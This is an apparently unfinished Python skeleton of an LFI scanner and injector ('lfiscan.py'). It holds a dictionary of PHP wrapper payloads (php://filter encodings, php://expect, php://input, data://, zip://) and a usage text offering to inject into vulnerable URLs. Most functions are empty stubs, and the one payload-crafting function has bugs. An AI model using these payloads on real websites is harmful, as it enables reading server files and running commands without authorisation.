#!/usr/bin/env python3

import os, sys
import re
import requests
import threading
from Crawler import Crawler

payloads = {
    "filter": {
        "b64encode": "php://filter/convert.base64-encode/resource=",
        "b64decode": "php://filter/convert.base64-decode/resource=",
        "rot13"    : "php://filter/read=string.rot13/resource=",
        "utf-16"   : "php://filter/convert.iconv.utf-8.utf-16/resource="
    },
    "expect"       : "php://expect/",
    "input"        : "php://input",
    "data"         : "data://text/plain;base64,",
    "zip"          : "zip://"
}

def usage():
    print("Usage: ./lfiscan.py [option] [argument]")
    print("Options:")
    print("--url <url>            : URL of the website")
    print("--scan                 : Crawl the website to search for vulnerable URLs")
    print("--test                 : Tests a vulnerable URL for LFI")
    print("--inject [type] [opts] : Executes LFI Injection on vulnerable URL")
    print("Be careful, this app only tracks for LFI vulnerabilities in URLs.")

def mayBeVulnerable(url):
    regex = re.compile('\?[a-zA-Z0-9]{1,}=')
    if regex.search(url):
        return True
    return False

def scan(url):
    pass

def test(url):
    pass

def craftPayload(url, itype, arguments):
    if itype == filter:
        crafted = url + payload["filter"][arguments[0]] + arguments[1]

#lfiscan.py --inject --resource=index.php 
def inject(url, itype, **argument):
    pass

if __name__ == '__main__':
    pass